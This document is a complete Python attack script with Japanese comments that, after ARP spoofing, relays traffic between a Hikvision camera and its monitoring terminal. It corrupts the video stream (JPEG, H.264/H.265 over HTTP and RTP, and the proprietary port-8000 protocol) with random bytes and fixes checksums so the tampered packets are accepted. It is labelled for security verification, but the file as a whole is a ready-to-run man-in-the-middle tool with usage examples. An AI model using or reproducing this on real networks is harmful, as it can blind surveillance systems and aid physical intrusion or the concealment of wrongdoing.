#!/usr/bin/env python3
"""
hik_relay_corrupt.py - HIKVISION カメラ映像データ中継・改ざん
セキュリティ検証用途専用

ARP Spoofing (hik_arp_spoof.py) で中間者となった状態で使用する。
カメラ → 監視端末 方向の映像データをリアルタイムに改ざんして転送し、
監視端末 → カメラ 方向はそのまま転送する。

対応プロトコル:
  - HTTP/ISAPI  (TCP port 80)   ... Web ブラウザ閲覧時のメインターゲット
  - RTSP/RTP    (UDP 動的ポート) ... RTSP クライアント利用時
  - 独自 (TCP port 8000)        ... iVMS-4200 等 HIKVISION 純正ソフト利用時

改ざん対象:
  - JPEG (0xFFD8 マーカー)         → データ部をランダム上書き
  - H.264 NAL ユニット             → スライスデータをランダム上書き
  - H.265 NAL ユニット             → スライスデータをランダム上書き
  - バイナリペイロード (port 8000)   → ヘッダ以降をランダム上書き
  ※ SPS/PPS/VPS はデコーダ停止防止のため保護

Usage:
    python hik_relay_corrupt.py --camera-ip 192.168.1.100 --monitor-ip 192.168.1.200 \\
        --camera-mac AA:BB:CC:DD:EE:01 --monitor-mac AA:BB:CC:DD:EE:02
    python hik_relay_corrupt.py --camera-ip 192.168.1.100 --monitor-ip 192.168.1.200 \\
        --camera-mac AA:BB:CC:DD:EE:01 --monitor-mac AA:BB:CC:DD:EE:02 \\
        --corrupt-ratio 1.0 --corrupt-size 300

注意:
  - hik_arp_spoof.py を先に起動してから本スクリプトを実行してください
  - OS の IP フォワーディングは無効にしてください (二重転送防止)
    Windows: netsh interface ipv4 set interface "イーサネット" forwarding=disabled
"""

import argparse
import random
import sys

from scapy.all import (
    IP, TCP, UDP, Ether, Raw, conf, get_if_hwaddr, sendp, sniff,
)

# scapy がポート番号で勝手にレイヤーを推測するのを防止
TCP.payload_guess = []


# ============================================================
#  H.264 / H.265 NAL Type 定数
# ============================================================

# --- H.264 ---
H264_NAL_SLICE     = 1    # Non-IDR slice
H264_NAL_IDR       = 5    # IDR フレーム (キーフレーム)
H264_NAL_SEI       = 6    # Supplemental Enhancement Info
H264_NAL_SPS       = 7    # Sequence Parameter Set
H264_NAL_PPS       = 8    # Picture Parameter Set
H264_NAL_FUA       = 28   # Fragmentation Unit A

# --- H.265 (HEVC) ---
H265_NAL_TRAIL_R   = 1    # Trailing picture
H265_NAL_IDR_W     = 19   # IDR (with RADL)
H265_NAL_IDR_NLP   = 20   # IDR (no leading pictures)
H265_NAL_VPS       = 32   # Video Parameter Set
H265_NAL_SPS       = 33   # Sequence Parameter Set
H265_NAL_PPS       = 34   # Picture Parameter Set
H265_NAL_FUA       = 49   # Fragmentation Unit

# デコーダ停止を防ぐため破壊しない NAL タイプ
H264_PROTECTED = {H264_NAL_SPS, H264_NAL_PPS}
H265_PROTECTED = {H265_NAL_VPS, H265_NAL_SPS, H265_NAL_PPS}


# ============================================================
#  バイト列改ざんユーティリティ
# ============================================================

def corrupt_bytes(data, offset, length):
    """data の offset から length バイトをランダム値で上書きして返す"""
    if offset >= len(data):
        return data
    end = min(offset + length, len(data))
    buf = bytearray(data)
    for i in range(offset, end):
        buf[i] = random.randint(0, 255)
    return bytes(buf)


# ============================================================
#  プロトコル別 改ざん関数
# ============================================================

def corrupt_http(payload, corrupt_size):
    """
    HTTP/ISAPI レスポンスペイロード内の映像データを改ざんする。

    検出優先順:
      1. JPEG マーカー (0xFFD8)  — MJPEG / スナップショット
      2. H.264 NAL start code    — HTTP 経由の H.264 ストリーム
      3. H.265 NAL start code    — HTTP 経由の H.265 ストリーム
      4. 大きなバイナリボディ      — 未知のフォーマット (フォールバック)
    """
    # ---------- 1. JPEG ----------
    idx = payload.find(b'\xff\xd8')
    if idx != -1 and idx + 10 + corrupt_size <= len(payload):
        return corrupt_bytes(payload, idx + 10, corrupt_size), True

    # ---------- 2/3. NAL start code (4-byte or 3-byte) ----------
    for start_code, sc_len in [(b'\x00\x00\x00\x01', 4),
                                (b'\x00\x00\x01', 3)]:
        pos = payload.find(start_code)
        if pos == -1:
            continue
        nal_pos = pos + sc_len
        if nal_pos >= len(payload):
            continue

        first_byte = payload[nal_pos]

        # H.264 判定: forbidden_zero_bit == 0 かつ type 1-23
        h264_type = first_byte & 0x1F
        if (first_byte >> 7) == 0 and 1 <= h264_type <= 23:
            if h264_type not in H264_PROTECTED:
                return corrupt_bytes(payload, nal_pos + 1, corrupt_size), True
            continue  # SPS/PPS はスキップ、次の start code を探す

        # H.265 判定: NAL header は 2 バイト
        if nal_pos + 1 < len(payload):
            h265_type = (first_byte >> 1) & 0x3F
            if h265_type not in H265_PROTECTED:
                return corrupt_bytes(payload, nal_pos + 2, corrupt_size), True

    # ---------- 4. 汎用バイナリボディ ----------
    if len(payload) > 500:
        hdr_end = payload.find(b'\r\n\r\n')
        if hdr_end != -1:
            body = hdr_end + 4
            if body + 50 + corrupt_size <= len(payload):
                return corrupt_bytes(payload, body + 50, corrupt_size), True

    return payload, False


def corrupt_rtp(payload, corrupt_size):
    """
    RTP ペイロード内の H.264/H.265 NAL データを改ざんする。

    RTP パケット構造:
      [RTP Header 12+ bytes][NAL Header 1-2 bytes][NAL Data ...]
    """
    if len(payload) < 13:
        return payload, False

    # RTP version チェック (v2)
    if ((payload[0] >> 6) & 0x03) != 2:
        return payload, False

    cc = payload[0] & 0x0F
    hdr_size = 12 + cc * 4

    # Extension ビット
    if payload[0] & 0x10:
        if len(payload) < hdr_size + 4:
            return payload, False
        ext_len = int.from_bytes(payload[hdr_size + 2:hdr_size + 4], 'big')
        hdr_size += 4 + ext_len * 4

    if hdr_size >= len(payload):
        return payload, False

    nal_byte = payload[hdr_size]

    # --- H.264 ---
    nal_type_264 = nal_byte & 0x1F

    if nal_type_264 == H264_NAL_FUA:
        # FU-A: FU indicator (1B) + FU header (1B) + data
        if hdr_size + 2 >= len(payload):
            return payload, False
        actual_type = payload[hdr_size + 1] & 0x1F
        if actual_type in H264_PROTECTED:
            return payload, False
        return corrupt_bytes(payload, hdr_size + 2, corrupt_size), True

    if nal_type_264 in H264_PROTECTED:
        return payload, False

    # H.264 通常 NAL or H.265 判定
    # H.265: forbidden_zero_bit(1) + type(6) + layer_id(6) + tid(3) = 16 bits
    h265_type = (nal_byte >> 1) & 0x3F
    if h265_type in H265_PROTECTED:
        return payload, False

    if h265_type == H265_NAL_FUA:
        # H.265 FU: FU indicator (2B) + FU header (1B) + data
        if hdr_size + 3 >= len(payload):
            return payload, False
        return corrupt_bytes(payload, hdr_size + 3, corrupt_size), True

    # 通常の NAL — ヘッダ直後から破壊
    data_offset = hdr_size + 1  # H.264: 1-byte header
    if 32 <= h265_type <= 40:
        data_offset = hdr_size + 2  # H.265: 2-byte header

    return corrupt_bytes(payload, data_offset, corrupt_size), True


def corrupt_hik_private(payload, corrupt_size):
    """
    HIKVISION 独自プロトコル (port 8000) のペイロードを改ざんする。
    プロトコル仕様は非公開のため、先頭 32 バイト (推定ヘッダ) を保持し
    それ以降をランダム上書きする。
    """
    if len(payload) < 64:
        return payload, False
    return corrupt_bytes(payload, 32, corrupt_size), True


# ============================================================
#  統計カウンタ
# ============================================================

class Stats:
    """改ざん統計を管理するクラス"""

    def __init__(self):
        self.total     = 0
        self.forwarded = 0
        self.corrupted = 0
        self.http      = 0
        self.rtp       = 0
        self.hik       = 0

    def summary(self):
        return (f"総受信:{self.total}  転送:{self.forwarded}  "
                f"改ざん:{self.corrupted}  "
                f"(HTTP:{self.http}  RTP:{self.rtp}  HIK独自:{self.hik})")


# ============================================================
#  メイン中継ハンドラ
# ============================================================

def make_handler(camera_mac, monitor_mac, my_mac, iface,
                 corrupt_ratio, corrupt_size, stats, stats_interval):
    """sniff() に渡すパケットハンドラ (クロージャ) を生成する"""

    cam_mac_lower = camera_mac.lower()
    mon_mac_lower = monitor_mac.lower()

    def handle(frame):
        if not frame.haslayer(Ether):
            return

        src = frame[Ether].src.lower()
        stats.total += 1

        # ================================================
        #  カメラ → 監視端末 (改ざん対象)
        # ================================================
        if src == cam_mac_lower:
            if frame.haslayer(Raw) and random.random() < corrupt_ratio:
                payload = frame[Raw].load

                # ポート番号でプロトコル判別
                sport = None
                if frame.haslayer(TCP):
                    sport = frame[TCP].sport
                elif frame.haslayer(UDP):
                    sport = frame[UDP].sport

                modified = False

                # HTTP / ISAPI (port 80, 443)
                if sport in (80, 443):
                    new_payload, modified = corrupt_http(payload, corrupt_size)
                    if modified:
                        stats.http += 1

                # HIKVISION 独自 (port 8000)
                elif sport == 8000:
                    new_payload, modified = corrupt_hik_private(payload, corrupt_size)
                    if modified:
                        stats.hik += 1

                # RTP/UDP (動的ポート, 1024 以上)
                elif frame.haslayer(UDP) and sport and sport >= 1024:
                    new_payload, modified = corrupt_rtp(payload, corrupt_size)
                    if modified:
                        stats.rtp += 1

                if modified:
                    frame[Raw].load = new_payload
                    # チェックサム再計算
                    if frame.haslayer(IP):
                        del frame[IP].chksum
                        del frame[IP].len
                    if frame.haslayer(TCP):
                        del frame[TCP].chksum
                    if frame.haslayer(UDP):
                        del frame[UDP].chksum
                        del frame[UDP].len
                    stats.corrupted += 1

            # 宛先を監視端末に書き換えて転送
            frame[Ether].dst = monitor_mac
            frame[Ether].src = my_mac
            sendp(frame, iface=iface, verbose=False)
            stats.forwarded += 1

        # ================================================
        #  監視端末 → カメラ (そのまま転送)
        # ================================================
        elif src == mon_mac_lower:
            frame[Ether].dst = camera_mac
            frame[Ether].src = my_mac
            sendp(frame, iface=iface, verbose=False)
            stats.forwarded += 1

        # ================================================
        #  統計表示
        # ================================================
        if stats.total % stats_interval == 0 and stats.total > 0:
            print(f"  [{stats.summary()}]")

    return handle


# ============================================================
#  エントリーポイント
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="HIKVISION カメラ映像中継・改ざん (セキュリティ検証用)")
    parser.add_argument("--camera-ip", required=True,
                        help="監視カメラの IP アドレス")
    parser.add_argument("--monitor-ip", required=True,
                        help="監視端末の IP アドレス")
    parser.add_argument("--camera-mac", required=True,
                        help="カメラの MAC アドレス")
    parser.add_argument("--monitor-mac", required=True,
                        help="監視端末の MAC アドレス")
    parser.add_argument("--iface", default="イーサネット",
                        help="ネットワークインターフェース名 (デフォルト: イーサネット)")
    parser.add_argument("--corrupt-ratio", type=float, default=0.7,
                        help="改ざん確率 0.0〜1.0 (デフォルト: 0.7)")
    parser.add_argument("--corrupt-size", type=int, default=200,
                        help="改ざんバイト数 (デフォルト: 200)")
    parser.add_argument("--stats-interval", type=int, default=100,
                        help="統計表示間隔 (パケット数, デフォルト: 100)")
    args = parser.parse_args()

    # ---------- インターフェース確認 ----------
    try:
        my_mac = get_if_hwaddr(args.iface)
    except Exception as e:
        print(f"[!] インターフェース '{args.iface}' が見つかりません: {e}")
        sys.exit(1)

    # ---------- 情報表示 ----------
    print("=" * 60)
    print("  HIKVISION 映像中継・改ざん — セキュリティ検証")
    print("=" * 60)
    print(f"  攻撃PC     MAC : {my_mac}")
    print(f"  カメラ      IP : {args.camera_ip}")
    print(f"              MAC : {args.camera_mac}")
    print(f"  監視端末    IP : {args.monitor_ip}")
    print(f"              MAC : {args.monitor_mac}")
    print(f"  改ざん確率       : {args.corrupt_ratio * 100:.0f}%")
    print(f"  改ざんサイズ     : {args.corrupt_size} bytes")
    print("-" * 60)
    print("  対応プロトコル:")
    print("    [HTTP/ISAPI]  TCP port 80/443  — Web ブラウザ (主力)")
    print("    [RTSP/RTP]    UDP 動的ポート     — RTSP クライアント")
    print("    [独自]        TCP port 8000    — iVMS-4200 等")
    print("=" * 60)
    print()
    print("[*] パケット中継開始... (Ctrl+C で終了)")
    print()

    # ---------- BPF フィルタ ----------
    # ARP Spoofing により攻撃 PC の MAC 宛に届くパケットをキャプチャ
    bpf = (f"ether dst {my_mac}"
           f" and (tcp or udp)"
           f" and host {args.camera_ip}"
           f" and host {args.monitor_ip}")
    print(f"[*] BPF フィルタ: {bpf}")
    print()

    # ---------- sniff 開始 ----------
    stats = Stats()
    handler = make_handler(
        args.camera_mac, args.monitor_mac, my_mac, args.iface,
        args.corrupt_ratio, args.corrupt_size,
        stats, args.stats_interval,
    )

    conf.verb = False
    try:
        sniff(iface=args.iface, filter=bpf, store=0, prn=handler)
    except KeyboardInterrupt:
        pass
    finally:
        print()
        print(f"[*] 終了  {stats.summary()}")


if __name__ == "__main__":
    main()
